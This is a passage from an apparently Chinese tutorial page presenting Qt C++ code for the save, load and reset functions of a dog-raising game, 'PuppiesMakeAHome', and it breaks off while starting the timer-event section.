class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br><span class="hljs-comment">//-------------------------读档存档界面-----------------------------</span><br><span class="hljs-comment">//初始载入存档名称</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShiJX_Widget::InitialRecord</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-function">QFile <span class="hljs-title">Fread</span><span class="hljs-params">(<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save1.txt&quot;</span>)</span></span>;<br>    <span class="hljs-type">bool</span> isExist=Fread.<span class="hljs-built_in">open</span>(QIODevice::ReadOnly);<br>    <span class="hljs-keyword">if</span>(isExist)&#123;<br>        <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fread)</span></span>;<br>        QString s;<br>        ds &gt;&gt; s;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(s.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">data</span>(),<span class="hljs-string">&quot;!@#$%^&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br>            ui-&gt;save1-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;新建家庭&quot;</span>);    <span class="hljs-comment">//save1是图形化界面中组件的名字，下同</span><br>            ui-&gt;read1-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;新建家庭&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            ui-&gt;save1-&gt;<span class="hljs-built_in">setText</span>(s);<br>            ui-&gt;read1-&gt;<span class="hljs-built_in">setText</span>(s);<br>        &#125;<br>    &#125;<br>    Fread.<span class="hljs-built_in">close</span>();<br><br>    Fread.<span class="hljs-built_in">setFileName</span>(<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save2.txt&quot;</span>);<br>    isExist=Fread.<span class="hljs-built_in">open</span>(QIODevice::ReadOnly);<br>    <span class="hljs-keyword">if</span>(isExist)&#123;<br>        <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fread)</span></span>;<br>        QString s;<br>        ds &gt;&gt; s;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(s.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">data</span>(),<span class="hljs-string">&quot;!@#$%^&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br>            ui-&gt;save2-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;新建家庭&quot;</span>);<br>            ui-&gt;read2-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;新建家庭&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br><br>            ui-&gt;save2-&gt;<span class="hljs-built_in">setText</span>(s);<br>            ui-&gt;read2-&gt;<span class="hljs-built_in">setText</span>(s);<br>        &#125;<br>    &#125;<br>    Fread.<span class="hljs-built_in">close</span>();<br><br>    Fread.<span class="hljs-built_in">setFileName</span>(<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save3.txt&quot;</span>);<br>    isExist=Fread.<span class="hljs-built_in">open</span>(QIODevice::ReadOnly);<br>    <span class="hljs-keyword">if</span>(isExist)&#123;<br>        <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fread)</span></span>;<br>        QString s;<br>        ds &gt;&gt; s;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(s.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">data</span>(),<span class="hljs-string">&quot;!@#$%^&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br>            ui-&gt;save3-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;新建家庭&quot;</span>);<br>            ui-&gt;read3-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;新建家庭&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br><br>            ui-&gt;save3-&gt;<span class="hljs-built_in">setText</span>(s);<br>            ui-&gt;read3-&gt;<span class="hljs-built_in">setText</span>(s);<br>        &#125;<br>    &#125;<br>    Fread.<span class="hljs-built_in">close</span>();<br><br>    Fread.<span class="hljs-built_in">setFileName</span>(<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save4.txt&quot;</span>);<br>    isExist=Fread.<span class="hljs-built_in">open</span>(QIODevice::ReadOnly);<br>    <span class="hljs-keyword">if</span>(isExist)&#123;<br>        <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fread)</span></span>;<br>        QString s;<br>        ds &gt;&gt; s;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(s.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">data</span>(),<span class="hljs-string">&quot;!@#$%^&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br>            ui-&gt;save4-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;新建家庭&quot;</span>);<br>            ui-&gt;read4-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;新建家庭&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br><br>            ui-&gt;save4-&gt;<span class="hljs-built_in">setText</span>(s);<br>            ui-&gt;read4-&gt;<span class="hljs-built_in">setText</span>(s);<br>        &#125;<br>    &#125;<br>    Fread.<span class="hljs-built_in">close</span>();<br><br>&#125;<br><br><span class="hljs-comment">//重置存档</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShiJX_Widget::ResetRecord</span><span class="hljs-params">(QString recordPath)</span></span><br><span class="hljs-function"></span>&#123;<br>    QPushButton* pSave=ui-&gt;save1,*pRead=ui-&gt;read1;<br>    <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save1.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save1;<br>        pRead=ui-&gt;read1;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save2.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save2;<br>        pRead=ui-&gt;read2;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save3.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save3;<br>        pRead=ui-&gt;read3;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;.../PuppiesMakeAHome/database/Save4.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save4;<br>        pRead=ui-&gt;read4;<br>    &#125;<br><br><br>    <span class="hljs-function">QFile <span class="hljs-title">Fwrite</span><span class="hljs-params">(recordPath)</span></span>;<br>    <span class="hljs-type">bool</span> isExist=Fwrite.<span class="hljs-built_in">open</span>(QIODevice::WriteOnly);  <span class="hljs-comment">//对存档文件进行只写操作写入空存档标志 !@#$%^</span><br>    <span class="hljs-keyword">if</span>(isExist)&#123;<br>        <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fwrite)</span></span>;<br>        QString s=<span class="hljs-string">&quot;!@#$%^&quot;</span>;<br>        ds &lt;&lt; <span class="hljs-built_in">QString</span>(s);<br>    &#125;<br><br>    pSave-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;新建家庭&quot;</span>);<br>    pRead-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;新建家庭&quot;</span>);<br><br>    Fwrite.<span class="hljs-built_in">close</span>();<br><br>&#125;<br><br><span class="hljs-comment">//读档</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShiJX_Widget::ReadRecord</span><span class="hljs-params">(QString recordPath)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> ret=QMessageBox::<span class="hljs-built_in">question</span>(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;提示&quot;</span>,<span class="hljs-string">&quot;&lt;h3&gt;确定选择该存档?&lt;/h3&gt;&quot;</span>);<br>    <span class="hljs-keyword">if</span>(ret==QMessageBox::No) <span class="hljs-keyword">return</span>;<br><br><br>    QPushButton* pSave=ui-&gt;save1,*pRead=ui-&gt;read1;<br>    <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save1.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save1;<br>        pRead=ui-&gt;read1;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save2.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save2;<br>        pRead=ui-&gt;read2;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save3.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save3;<br>        pRead=ui-&gt;read3;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save4.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save4;<br>        pRead=ui-&gt;read4;<br>    &#125;<br><br>    <span class="hljs-function">QFile <span class="hljs-title">Fread</span><span class="hljs-params">(recordPath)</span></span>;<br>    <span class="hljs-keyword">if</span>(pSave-&gt;<span class="hljs-built_in">text</span>()==<span class="hljs-string">&quot;新建家庭&quot;</span>)<br>    &#123;<br>        <span class="hljs-type">bool</span> isExist=Fread.<span class="hljs-built_in">open</span>(QIODevice::WriteOnly);<br>        <span class="hljs-keyword">if</span>(isExist)<br>        &#123;<br>            <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fread)</span></span>;<br>            QString tmp=<span class="hljs-string">&quot;&quot;</span>;<br>            Family family;<br>            <span class="hljs-comment">//初始化家庭</span><br><br>            Demo.<span class="hljs-built_in">Initial</span>();<br>            Demo.dogs.<span class="hljs-built_in">clear</span>();<br>            <span class="hljs-built_in">InitialStore</span>();<br>            <span class="hljs-built_in">InitialHome</span>();<br>            <span class="hljs-comment">//家庭信息</span><br>            <span class="hljs-keyword">while</span>(tmp==<span class="hljs-string">&quot;&quot;</span>)<br>            &#123;<br>                tmp=QInputDialog::<span class="hljs-built_in">getText</span>(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;提示&quot;</span>,<span class="hljs-built_in">QString</span>(<span class="hljs-string">&quot;&lt;h3&gt;请给小家起个名字吧：&lt;/h3&gt;&quot;</span>));<br>            &#125;<br>            Demo.<span class="hljs-built_in">setFamilyTitle</span>(tmp);<br>            ds&lt;&lt;Demo.<span class="hljs-built_in">getFamilyTitle</span>();<br>            pSave-&gt;<span class="hljs-built_in">setText</span>(Demo.<span class="hljs-built_in">getFamilyTitle</span>());<br>            pRead-&gt;<span class="hljs-built_in">setText</span>(Demo.<span class="hljs-built_in">getFamilyTitle</span>());<br><br>            Demo.<span class="hljs-built_in">setFamilyWealth</span>(<span class="hljs-number">30</span>);<br>            ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getFamilyWealth</span>());<br>            Demo.<span class="hljs-built_in">setFamilyLove</span>(<span class="hljs-number">5</span>);<br>            ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getFamilyLove</span>());<br><br>            QMessageBox::<span class="hljs-built_in">question</span>(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;新建家庭成功&quot;</span>,<span class="hljs-string">&quot;&lt;h3&gt;快去领养一只狗狗吧！&lt;/h3&gt;&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">InitInformation</span>();<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        QMessageBox::<span class="hljs-built_in">information</span>(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;读档成功&quot;</span>,<span class="hljs-string">&quot;快回家看看小狗吧~&quot;</span>);<br>        <span class="hljs-type">bool</span> isExist=Fread.<span class="hljs-built_in">open</span>(QIODevice::ReadOnly);<br>        <span class="hljs-keyword">if</span>(isExist)&#123;<br>            <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fread)</span></span>;<br>            QString itmp,jtmp,ktmp,stmp;<br><br>            <span class="hljs-comment">//初始化</span><br>            Demo.<span class="hljs-built_in">Initial</span>();<br>            <span class="hljs-built_in">InitialHome</span>();<br><br>            <span class="hljs-comment">//家庭信息</span><br>            ds&gt;&gt;stmp;<br>            Demo.<span class="hljs-built_in">setFamilyTitle</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">data</span>());<br>            ds&gt;&gt;stmp;<br>            Demo.<span class="hljs-built_in">setFamilyWealth</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>            ds&gt;&gt;stmp;<br>            Demo.<span class="hljs-built_in">setFamilyLove</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>            ds&gt;&gt;stmp;<br>            Demo.<span class="hljs-built_in">setFamilyReserveBonse</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>            ds&gt;&gt;stmp;<br>            Demo.<span class="hljs-built_in">setFamilyReserveDogfood</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>            ds&gt;&gt;stmp;<br>            Demo.<span class="hljs-built_in">setFamilyReserveMedicine</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>            ds&gt;&gt;stmp;<br>            Demo.<span class="hljs-built_in">setPlayerTime</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>            ds&gt;&gt;stmp;<br>            Demo.member=stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>();<br><br>            <span class="hljs-comment">//狗狗信息</span><br>            Dog *dogTmp;  <span class="hljs-comment">// 在 if-else 结构之前声明</span><br><br>            ds &gt;&gt; itmp;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; itmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>(); j++)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (Demo.member &gt; <span class="hljs-number">4</span>) &#123;<br>                    dogTmp = <span class="hljs-keyword">new</span> <span class="hljs-built_in">BigDog</span>();  <span class="hljs-comment">// 初始化变量</span><br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    dogTmp = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SmallDog</span>();  <span class="hljs-comment">// 初始化变量</span><br>                &#125;<br><br>                ds&gt;&gt;stmp;<br>                dogTmp-&gt;<span class="hljs-built_in">setDogName</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">data</span>());<br>                ds&gt;&gt;stmp;<br>                dogTmp-&gt;<span class="hljs-built_in">setDogAbility</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>                ds&gt;&gt;stmp;<br>                dogTmp-&gt;<span class="hljs-built_in">setDogEnergy</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toDouble</span>());<br>                ds&gt;&gt;stmp;<br>                dogTmp-&gt;<span class="hljs-built_in">setDogIll</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>                ds&gt;&gt;stmp;<br>                dogTmp-&gt;<span class="hljs-built_in">setDogState</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>                ds&gt;&gt;stmp;<br>                dogTmp-&gt;<span class="hljs-built_in">setDogWorktime</span>(stmp.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">toInt</span>());<br>                Demo.dogs.<span class="hljs-built_in">push_back</span>(dogTmp);<br><br>            &#125;<br>        &#125;<br>    &#125;<br>    Fread.<span class="hljs-built_in">close</span>();<br>    haveLoadGame=<span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">renovate</span>();<br>    <span class="hljs-built_in">InitialHome</span>();<br><br>    ui-&gt;stackedWidget-&gt;<span class="hljs-built_in">setCurrentWidget</span>(ui-&gt;home);<br><br>    <span class="hljs-comment">//禁用/启用按钮</span><br>    <span class="hljs-keyword">if</span>(haveLoadGame==<span class="hljs-number">0</span>)&#123;<br>        ui-&gt;pushButton_newmember-&gt;<span class="hljs-built_in">setEnabled</span>(<span class="hljs-literal">false</span>);<br>        ui-&gt;pushButton_gotostore-&gt;<span class="hljs-built_in">setEnabled</span>(<span class="hljs-literal">false</span>);<br>        ui-&gt;pushButton_honor-&gt;<span class="hljs-built_in">setEnabled</span>(<span class="hljs-literal">false</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        ui-&gt;pushButton_save-&gt;<span class="hljs-built_in">setEnabled</span>(<span class="hljs-literal">true</span>);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">//存档</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShiJX_Widget::SaveRecord</span><span class="hljs-params">(QString recordPath)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> ret=QMessageBox::<span class="hljs-built_in">question</span>(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;提示&quot;</span>,<span class="hljs-string">&quot;确定覆盖存档?&quot;</span>);<br>    <span class="hljs-keyword">if</span>(ret==QMessageBox::No) <span class="hljs-keyword">return</span>;<br><br>    QPushButton* pSave=ui-&gt;save1,*pRead=ui-&gt;read1;<br>    <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save1.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save1;<br>        pRead=ui-&gt;read1;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save2.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save2;<br>        pRead=ui-&gt;read2;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save3.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save3;<br>        pRead=ui-&gt;read3;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save4.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save4;<br>        pRead=ui-&gt;read4;<br>    &#125;<br><br><br>    <span class="hljs-function">QFile <span class="hljs-title">Fread</span><span class="hljs-params">(recordPath)</span></span>;<br>    <span class="hljs-type">bool</span> isExist=Fread.<span class="hljs-built_in">open</span>(QIODevice::WriteOnly);<br>    <span class="hljs-keyword">if</span>(isExist)<br>    &#123;<br>        <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fread)</span></span>;<br>        <br><span class="hljs-comment">//按顺序存储关键信息，读档顺序需和存档顺序一致</span><br>        <br>        <span class="hljs-comment">//家庭信息</span><br>        ds&lt;&lt;Demo.<span class="hljs-built_in">getFamilyTitle</span>();<br>        pSave-&gt;<span class="hljs-built_in">setText</span>(Demo.<span class="hljs-built_in">getFamilyTitle</span>());<br>        pRead-&gt;<span class="hljs-built_in">setText</span>(Demo.<span class="hljs-built_in">getFamilyTitle</span>());<br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getFamilyWealth</span>());<br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getFamilyLove</span>());<br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getFamilyReserveBonse</span>());<br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getFamilyReserveDogfood</span>());<br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getFamilyReserveMedicine</span>());<br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getPlayerTime</span>());<br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.member);<br><br>        <span class="hljs-comment">//狗狗信息</span><br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.dogs.<span class="hljs-built_in">size</span>());<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;Demo.dogs.<span class="hljs-built_in">size</span>();j++)<br>        &#123;<br>            ds&lt;&lt;Demo.dogs[j]-&gt;<span class="hljs-built_in">getDogName</span>();<br>            ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.dogs[j]-&gt;<span class="hljs-built_in">getDogAbility</span>());<br>            ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.dogs[j]-&gt;<span class="hljs-built_in">getDogEnergy</span>());<br>            ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.dogs[j]-&gt;<span class="hljs-built_in">getDogIll</span>());<br>            ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.dogs[j]-&gt;<span class="hljs-built_in">getDogState</span>());<br>            ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.dogs[j]-&gt;<span class="hljs-built_in">getDogWorktime</span>());<br>        &#125;<br>    &#125;<br>    Fread.<span class="hljs-built_in">close</span>();<br>    <span class="hljs-built_in">InitialRecord</span>();<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="定时器事件"><a href="#定时器事件" class="headerlink" title="定时器事件"></a>定时器事件</h5><p>需要在主界面头文件中声明如下部分:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QTimer&gt;</span></span><br><span class="hljs-comment">//public</span><br><span class="hljs-type">int</span> millisecondPerHour=<span class="hljs-number">10000</span>;      <span class="hljs-comment">//游戏速率</span><br><span class="hljs-type">int</span> timerKiller;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">timerEvent</span><span class="hljs-params">(QTimerEvent *e)</span></span>;  <span class="hljs-comment">//计时器事件</span><br></code></pre></td></tr></table></figure><p>cpp文件中构造并使用定时器：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">//需要按时间刷新的函数一起写在定时器时间里</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShiJX_Widget::timerEvent</span><span class="hljs-params">(QTimerEvent *)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> x;<br>    x=Demo.<span 